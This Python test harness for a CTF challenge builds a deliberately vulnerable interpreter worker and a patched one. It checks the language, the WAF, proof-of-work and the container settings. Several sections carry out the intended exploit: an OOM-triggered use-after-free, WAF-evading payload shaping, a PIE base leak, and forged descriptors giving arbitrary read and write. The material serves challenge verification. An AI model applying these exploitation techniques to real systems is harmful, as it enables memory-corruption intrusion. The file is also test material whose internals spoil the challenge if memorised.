#!/usr/bin/env python3
"""
Regression / verification harness for "Poltergeist".

Compiles the Séance worker from src/chall.c in two flavours -- the shipped
(vulnerable) build and a fixed build (an organizer patch this harness applies to
a throwaway copy of the source -- the handout itself ships no such patch) --
starts each as a real HTTP worker, and drives it over sockets.

Covers the challenge's verification checklist:
  * the language's documented features work;
  * malformed programs produce controlled errors (HTTP 400);
  * resource limits are enforced (OOM -> 500, step budget -> 400) and the
    worker survives a fatal OOM;
  * requests are handled by one persistent worker;
  * normal request cleanup preserves the invariant (recall() clears);
  * the exceptional OOM path leaves engine state dangling (the bug);
  * the cross-request use-after-free is observable (a prior request's freed
    arena bytes leak into a later request)  <-- the regression test;
  * the fixed (patched) build restores the invariant (no leak);
  * ordinary programs never disclose the flag (reveal() stays sealed); the full
    chain -- leak the PIE base, forge an arbitrary write to unseal, reveal -- does;
  * the container compose file declares the documented security boundary.

Run:  python3 tests/test_chall.py
Needs only a C compiler (cc) and the Python standard library.
"""

import hashlib
import os
import re
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
SRC = os.path.join(ROOT, "src", "chall.c")
COMPOSE = os.path.join(ROOT, "docker-compose.yml")
FLAG = "ccsCTF{harness_flag_in_memory}"
MEMLIMIT = "262144"          # per-request memory_limit (matches the deployed service)
OOM_INT = 900000             # OOM count that clears memory_limit AND the WAF (<7 digits)


def solve_pow(challenge, bits):
    tb, rem = bits // 8, bits % 8
    pre = challenge.encode()
    i = 0
    while True:
        nonce = b"%x" % i
        d = hashlib.sha256(pre + nonce).digest()
        if all(d[j] == 0 for j in range(tb)) and (rem == 0 or d[tb] >> (8 - rem) == 0):
            return "%s.%s" % (challenge, nonce.decode())
        i += 1

PASS = FAIL = SKIP = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    mark = "PASS" if cond else "FAIL"
    if cond:
        PASS += 1
    else:
        FAIL += 1
    print("  [%s] %s%s" % (mark, name, (" -- " + detail) if detail and not cond else ""))


def skip(name, why):
    global SKIP
    SKIP += 1
    print("  [SKIP] %s -- %s" % (name, why))


# --------------------------------------------------------------------------- #

def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def compile_src(src_path, no_pie):
    if src_path is None:
        return None
    out = os.path.join(tempfile.mkdtemp(), "run")
    cmd = ["cc", "-O1", "-w"]
    if no_pie:
        cmd += ["-no-pie", "-fno-pie"]
    cmd += ["-o", out, src_path]
    r = subprocess.run(cmd, capture_output=True)
    if r.returncode != 0:
        return None
    return out


def fixed_source():
    """Write a patched copy of the handout source that clears g_echo on the fatal
    OOM path -- the organizer fix. The shipped source carries NO such patch, so
    the harness (not the handout) constructs the fixed variant."""
    text = open(SRC).read()
    needle = 'respond(500, "text/plain", "fatal: out of memory\\n", 21);'
    if needle not in text:
        return None
    text = text.replace(needle, "g_echo = NULL;\n                " + needle, 1)
    p = os.path.join(tempfile.mkdtemp(), "chall_fixed.c")
    with open(p, "w") as f:
        f.write(text)
    return p


class Worker:
    def __init__(self, binary, pow_bits=0):
        self.port = free_port()
        self.pow_bits = pow_bits
        env = dict(os.environ, FLAG=FLAG, POW_BITS=str(pow_bits))
        self.proc = subprocess.Popen(
            [binary, "-S", "127.0.0.1:%d" % self.port, "-m", MEMLIMIT],
            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True)   # own process group: the worker forks a watchdog child
        for _ in range(100):
            try:
                socket.create_connection(("127.0.0.1", self.port), timeout=0.2).close()
                return
            except OSError:
                time.sleep(0.05)
        raise RuntimeError("worker did not come up")

    def http(self, body=b"", headers=None, path="/seance", method="POST"):
        headers = headers or {}
        req = "%s %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n" % (method, path)
        req += "Content-Length: %d\r\n" % len(body)
        for k, v in headers.items():
            req += "%s: %s\r\n" % (k, v)
        req += "\r\n"
        s = socket.create_connection(("127.0.0.1", self.port), timeout=5)
        s.sendall(req.encode() + body)
        buf = b""
        while True:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        s.close()
        head, _, payload = buf.partition(b"\r\n\r\n")
        st = int(re.match(rb"HTTP/1\.\d (\d+)", head).group(1))
        return st, payload

    def run(self, src):
        return self.http(src.encode())

    def close(self):
        try:
            os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)   # parent + forked worker
        except Exception:
            try:
                self.proc.kill()
            except Exception:
                pass
        try:
            self.proc.wait(timeout=3)
        except Exception:
            pass


OOM = {"X-Seance-Echo": "s:%d:x;" % OOM_INT}   # length blows memory_limit -> fatal OOM


def section(t):
    print("\n== %s ==" % t)


def main():
    if not os.path.isfile(SRC):
        print("cannot find", SRC)
        sys.exit(2)

    section("0. the project builds")
    vuln = compile_src(SRC, no_pie=False)
    check("vulnerable build compiles", vuln is not None)
    fixed = compile_src(fixed_source(), no_pie=False)
    check("fixed (patched) build compiles", fixed is not None)
    if vuln is None:
        sys.exit(1)

    w = Worker(vuln)
    try:
        section("1. the language works")
        st, b = w.run('whisper "boo, " . "mortal";')
        check("string concat", st == 200 and b.strip() == b"boo, mortal", repr(b))
        st, b = w.run('rite sq($n){ return $n*$n; } whisper str(sq(9));')
        check("rite + return", b.strip() == b"81", repr(b))
        st, b = w.run('summon $i=0; chant ($i<3){ whisper str($i); $i=$i+1; }')
        check("chant loop", b == b"0\n1\n2\n", repr(b))
        st, b = w.run('when (3>2){ whisper "y"; } otherwise { whisper "n"; }')
        check("when/otherwise", b.strip() == b"y", repr(b))
        st, b = w.run('summon $a=[10,20,30]; whisper str($a[1]); whisper str(len($a));')
        check("arrays + len", b == b"20\n3\n", repr(b))
        st, b = w.run('whisper chr(66).chr(79).chr(79); whisper str(ord("A"));')
        check("chr/ord", b == b"BOO\n65\n", repr(b))

        section("2. malformed programs -> controlled errors (HTTP 400)")
        check("parse error -> 400", w.run("whisper (;")[0] == 400)
        check("division by zero -> 400", w.run("whisper 1/0;")[0] == 400)
        check("unknown variable -> 400", w.run("whisper $nope;")[0] == 400)
        check("unknown rite -> 400", w.run("whisper bogus();")[0] == 400)

        section("3. resource limits enforced; worker survives a fatal OOM")
        check("OOM via repeat -> 500", w.run('summon $x=repeat("A",%d);' % OOM_INT)[0] == 500)
        check("OOM via unserialize header -> 500", w.http(b"", OOM)[0] == 500)
        check("step budget -> 400",
              w.run("summon $i=0; chant (1==1){ $i=$i+1; }")[0] == 400)
        check("worker still answers after OOM",
              w.run('whisper "alive";')[1].strip() == b"alive")

        section("4/5. persistent worker + normal cleanup preserves the invariant")
        # health served repeatedly by the same process
        check("healthz x3 on one worker",
              all(w.http(path="/healthz", method="GET")[1] == b"ok" for _ in range(3)))
        # leave() then a NORMAL end -> next request's recall() is cleared
        w.run('leave("ghost");')
        st, b = w.run("whisper str(recall());")
        check("recall() cleared after a normal request", b.strip() == b"null", repr(b))

        section("6/7/8. cross-request use-after-free is observable (regression)")
        secret = "SPECTRE_9f2c17ab"
        # req1: leave the secret, THEN OOM so end-of-request cleanup is skipped
        st1, _ = w.run('leave("%s"); summon $x = repeat("A", %d);' % (secret, OOM_INT))
        st2, b = w.run("whisper recall();")
        leaked = secret.encode() in b
        check("req1 OOM path returns 500", st1 == 500)
        check("req2 recall() leaks req1's freed arena (the UAF)", leaked, repr(b[:64]))

        section("9. no in-memory flag and no gate: the flag lives only on disk")
        st, b = w.run('whisper "nothing to see"; whisper str(1+1);')
        check("benign program output excludes the flag", FLAG.encode() not in b)
        st, b = w.run('whisper reveal();')
        check("reveal()/the gate are gone (unknown rite -> 400)", st == 400, repr(b[:60]))
        check("echo_write (the write-what-where primitive) exists",
              w.run('echo_write("x");')[0] == 200)

        section("9b. the WAF turns away naive and scanner traffic")
        # the naive OOM (a giant literal count) is refused before it ever runs
        st, b = w.run('summon $x = repeat("A", 90000000);')
        check("WAF: 7+ digit literal -> 403", st == 403 and b"warded" in b, repr(b[:48]))
        st, b = w.http(b"", {"X-Seance-Echo": "s:90000000:x;"})
        check("WAF: 7+ digit literal in echo header -> 403",
              st == 403 and b"warded" in b, repr(b[:48]))
        st, b = w.run('whisper "/etc/passwd";')
        check("WAF: traversal/scanner signature -> 403", st == 403, repr(b[:48]))
        st, b = w.run('whisper str(len("' + ("A" * 5000) + '"));')
        check("WAF: oversized body -> 403", st == 403, repr(b[:48]))
        # the shaped exploit traffic is NOT blocked: a <7-digit OOM still fires,
        # and a forged-Val string literal (\\x escapes) passes cleanly.
        check("WAF: shaped 6-digit OOM still reaches the worker (500)",
              w.run('summon $x = repeat("A", %d);' % OOM_INT)[0] == 500)
        forged = struct.pack("<qqq", 2, 8, 0x4000000000)
        esc = b"".join(b"\\x%02x" % c for c in forged)
        check("WAF: forged-Val literal passes (not treated as a probe)",
              w.http(b'summon $f = "' + esc + b'"; whisper "ok";')[0] == 200)
    finally:
        w.close()

    section("9c. the proof-of-work gate is enforced and scriptable")
    wp = Worker(vuln, pow_bits=14)
    try:
        st, b = wp.http(b'whisper "hi";')
        check("PoW: /seance without a proof -> 403",
              st == 403 and b"proof-of-work" in b, repr(b[:48]))
        st, b = wp.http(path="/pow", method="GET")
        m = re.search(rb"pow ([0-9a-f]{24}) (\d+)", b)
        check("PoW: GET /pow issues a challenge", m is not None, repr(b[:48]))
        if m:
            token = solve_pow(m.group(1).decode(), int(m.group(2)))
            st, b = wp.http(b'whisper "hi";', {"X-Pow": token})
            check("PoW: a solved proof is accepted (200)",
                  st == 200 and b.strip() == b"hi", repr(b[:48]))
            st, b = wp.http(b'whisper "again";', {"X-Pow": token})
            check("PoW: the proof is reusable within its window",
                  st == 200 and b.strip() == b"again", repr(b[:48]))
            st, b = wp.http(b'whisper "no";', {"X-Pow": m.group(1).decode() + ".deadbeef"})
            check("PoW: a wrong nonce is rejected (403)", st == 403, repr(b[:48]))
    finally:
        wp.close()

    section("10. the fixed (patched) build kills both primitives")
    if fixed is None:
        skip("fixed-build no-leak", "could not build the patched source")
    else:
        wf = Worker(fixed)
        try:
            secret = "SPECTRE_FIXED_42"
            wf.run('leave("%s"); summon $x = repeat("A", %d);' % (secret, OOM_INT))
            st, b = wf.run("whisper recall();")
            check("fixed worker: recall() does NOT leak after OOM",
                  secret.encode() not in b, repr(b[:64]))
            # with g_echo cleared on the OOM path, a forged descriptor never
            # becomes *g_echo, so recall() reads nothing -> read AND write die.
            wf.http(b"", OOM)
            forged = struct.pack("<qqq", 2, 8, 0x41414141)
            esc = b"".join(b"\\x%02x" % c for c in forged)
            st, b = wf.http(b'summon $f = "' + esc + b'"; whisper recall();')
            check("fixed worker: forged recall() returns null (UAF dead)",
                  b.strip() == b"null", repr(b[:60]))
        finally:
            wf.close()

    section("11. the UAF yields arbitrary read AND write (the RCE primitives)")
    # Full RCE (open/read/write(/flag.txt->socket) ROP) is driven end-to-end by
    # solve/solve.py against the container; here we prove the two primitives the
    # chain stands on -- read-what-where and write-what-where -- deterministically
    # and without any libc dependence, by reading/overwriting `memory_limit`.
    offs = {}
    try:
        nm = subprocess.run(["nm", vuln], capture_output=True, text=True)
        for line in nm.stdout.splitlines():
            parts = line.split()
            if len(parts) == 3:
                sym = parts[2].lstrip("_")
                if sym in ("arena", "memory_limit"):
                    offs[sym] = int(parts[0], 16)
    except Exception:
        pass
    if "arena" not in offs or "memory_limit" not in offs:
        skip("RCE primitives", "could not resolve arena/memory_limit via nm "
             "(authoritatively covered by solve/solve.py against the container)")
    else:
        we = Worker(vuln)

        def esc(bs):
            return b"".join(b"\\x%02x" % c for c in bs)

        def forge_read(addr, length):
            we.http(b"", OOM)                       # poison: g_echo dangles @ arena[0]
            val = struct.pack("<qqq", 2, length, addr)
            return we.http(b'summon $f = "' + esc(val) + b'"; whisper recall();')[1]

        def forge_write(addr, data):
            we.http(b"", OOM)
            val = struct.pack("<qqq", 2, len(data), addr)
            we.http(b'summon $f = "' + esc(val) + b'"; summon $d = "' + esc(data) +
                    b'"; echo_write($d);')
        try:
            # stage 1: leak the PIE image base through the UAF descriptor window
            we.run('summon $p = repeat("A", 64); leave($p); summon $z = repeat("A", %d);' % OOM_INT)
            dump, base = we.run('summon $a = ["BBBBBBBB"]; whisper recall();')[1][:64], None
            for i in range(0, max(0, len(dump) - 7), 8):
                v = struct.unpack_from("<Q", dump, i)[0]
                cand = v - offs["arena"] - 24
                if 0x1000 < cand < 0x800000000000 and (cand & 0xfff) == 0:
                    base = cand
                    break
            check("stage 1: leaked a page-aligned PIE image base", base is not None, repr(dump))
            if base is not None:
                ml = base + offs["memory_limit"]
                got = struct.unpack_from("<Q", forge_read(ml, 8), 0)[0]
                check("arbitrary READ: recall() reads memory_limit at a chosen address",
                      got == int(MEMLIMIT), "read 0x%x" % got)
                marker = 0x4142          # small (keeps the OOM poison working)
                forge_write(ml, struct.pack("<Q", marker))
                back = struct.unpack_from("<Q", forge_read(ml, 8), 0)[0]
                check("arbitrary WRITE: echo_write overwrites memory_limit at that address",
                      back == marker, "read back 0x%x" % back)
        finally:
            we.close()

    section("11b. the shipped handout binary is stripped (RE required)")
    dist_bin = os.path.join(ROOT, "dist", "chall")
    if not os.path.isfile(dist_bin):
        skip("handout stripped", "dist/chall not present (run tools/ctf.py dist)")
    else:
        data = open(dist_bin, "rb").read()
        has_symtab = None
        if data[:4] == b"\x7fELF":
            shoff = struct.unpack_from("<Q", data, 0x28)[0]
            ent = struct.unpack_from("<H", data, 0x3A)[0]
            num = struct.unpack_from("<H", data, 0x3C)[0]
            has_symtab = any(
                struct.unpack_from("<I", data, shoff + i * ent + 4)[0] == 2
                for i in range(num))
        check("dist/chall has no .symtab (offsets must be reverse-engineered)",
              has_symtab is False, "ELF? %s symtab=%s" % (data[:4] == b"\x7fELF", has_symtab))
        off_file = os.path.join(ROOT, "solve", "chall.offsets")
        check("author-only solve/chall.offsets exists (beside the solver, not in the handout)",
              os.path.isfile(off_file))
        check("dist/ carries no offsets file (would leak the RE to players)",
              not os.path.isfile(os.path.join(ROOT, "dist", "chall.offsets")))

    section("12. the container declares the documented security boundary")
    try:
        cm = open(COMPOSE).read()
        for knob in ["read_only: true", "cap_drop: [ALL]", "no-new-privileges:true",
                     "user: '10001:10001'", "mem_limit:", "cpus:", "pids_limit:",
                     ":8080"]:
            check("compose: %s" % knob, knob in cm)
    except OSError as e:
        check("docker-compose.yml present", False, str(e))

    print("\n== results: %d passed, %d failed, %d skipped ==" % (PASS, FAIL, SKIP))
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
